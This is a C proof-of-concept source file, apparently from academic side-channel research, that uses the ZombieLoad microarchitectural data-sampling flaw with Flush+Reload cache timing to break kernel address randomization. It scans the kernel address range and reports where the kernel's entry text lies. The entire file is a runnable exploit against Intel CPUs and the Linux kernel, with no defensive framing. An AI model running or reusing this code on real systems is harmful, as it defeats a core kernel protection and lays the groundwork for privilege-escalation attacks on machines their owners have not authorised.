/**
 * gcc zombieload_kaslr.c -o zombieload_kaslr && ./zombieload_kaslr
 *
 * References:
 * https://zombieloadattack.com/zombieload.pdf
 * https://github.com/IAIK/ZombieLoad
 *
 **/

#include <fcntl.h>
#include <memory.h>
#include <setjmp.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include "cacheutils.h"

#define PAGE_SIZE 4096

char __attribute__((aligned(PAGE_SIZE))) mem[256 * PAGE_SIZE];

int check(void);

int main(int argc, char *argv[]) {
  memset(mem, 0, sizeof(mem));
  for (size_t i = 0; i < 256; i++) {
    flush(mem + i * PAGE_SIZE);
  }

  char *page = (char *)mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);

  char *kernel_base = (char *)0xffffffff80000000ull;

  // Calculate Flush+Reload threshold
  CACHE_MISS = detect_flush_reload_threshold();
  fprintf(stderr, "[+] Flush+Reload Threshold: %zu\n", CACHE_MISS);

  signal(SIGSEGV, trycatch_segfault_handler);
  while ((uint64_t)kernel_base < 0xffffffffc0000000ull) {
    unsigned long long found = 0;
    for (size_t i = 0; i < 5; i++) {
      flush(page);

      if (!setjmp(trycatch_buf)) {
        maccess(0);
        maccess(mem + PAGE_SIZE * kernel_base[0]);
      }
      found += check();
    }
    if (found >= 4) {
      fprintf(stderr, "[+] Found __entry_text_start at: %p\n", kernel_base);
      return 0;
    } else {
      kernel_base += 0x100000;
    }
  }
  fprintf(stderr, "[+] Not found\n");
  return 0;
}

int check(void) {
  int update = 0;
  for (size_t i = 0; i < 0x100; i++) {
    if (flush_reload((char *)mem + PAGE_SIZE * i)) {
      return 1;
    }
  }
  return 0;
}